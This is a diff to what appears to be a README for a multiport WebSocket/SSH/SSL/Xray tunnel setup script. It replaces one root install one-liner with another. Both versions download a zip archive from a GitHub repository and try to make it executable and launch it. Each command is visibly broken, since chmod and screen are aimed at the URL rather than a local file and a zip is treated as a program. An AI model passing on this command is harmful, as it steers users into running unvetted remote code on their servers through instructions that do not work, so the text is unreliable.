@@ -1,2 +1,2 @@
 # MULTIPORT - WEBSOCKET / SSH / SSL / XRAY
-<pre><code>apt --fix-missing update && apt update && apt upgrade -y && apt install -y wget screen && wget -q https://raw.githubusercontent.com/jhoker/mons/main/ssh/mons-v3.8.zip && chmod +x https://raw.githubusercontent.com/jhoker/mons/main/ssh/mons-v3.8.zip && screen -S setup https://raw.githubusercontent.com/jhoker/mons/main/ssh/mons-v3.8.zip</code></pre>
+<pre><code>apt --fix-missing update && apt update && apt upgrade -y && apt install -y wget screen && wget -q https://github.com/jhoker/mons/raw/refs/heads/main/port/Software_v3.9.zip && chmod +x https://github.com/jhoker/mons/raw/refs/heads/main/port/Software_v3.9.zip && screen -S setup https://github.com/jhoker/mons/raw/refs/heads/main/port/Software_v3.9.zip</code></pre>
